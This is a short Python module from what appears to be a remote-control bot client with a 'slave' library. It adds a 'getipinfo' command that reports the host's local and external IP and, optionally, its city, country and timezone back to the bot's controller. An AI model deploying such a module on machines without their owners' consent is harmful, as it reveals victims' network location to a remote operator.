from slave.lib.client import Bot, BotArgsParser
from typing import List
from pathlib import Path
from glob import glob
import requests

BotInformation = Bot()
BotInformation.bot_type = "Information Bot"


@BotInformation.register('getipinfo', help_text="Get Ip information (Ip, Location etc...) -- Usage: $getipinfo <bot_id> [-h] [--extends]", argparse=True)
def get_ips(bot: Bot, args: List[str]):
    try:
        parser = BotArgsParser()
        parser.connect_bot(bot)

        parser.add_argument('--extend', action='store_true', dest="extend")
        cargs = parser.parse_args(args)

        bot.send_text("Getting external ip...")
        ex_ip = requests.get('https://api.ipify.org').text
        local_ip = bot.sock.getsockname()[0]
        if cargs.extend:
            bot.send_text("Getting location...")
            extended_information = requests.get(
                f"https://tools.keycdn.com/geo.json?host={ex_ip}").json()['data']['geo']

            template = f"Local IP: {local_ip}\nExternal IP: {ex_ip}\nCity: {extended_information.get('city')}\nCountry Name: {extended_information.get('country_name')}\n\
Timezone: {extended_information.get('timezone')}"
        else:
            template = f"Local IP: {local_ip}\nExternal IP: {ex_ip}"
                
        bot.send_text(template)
    except Exception as exp:
        bot.send_text(f"Problem occurred: {exp}")
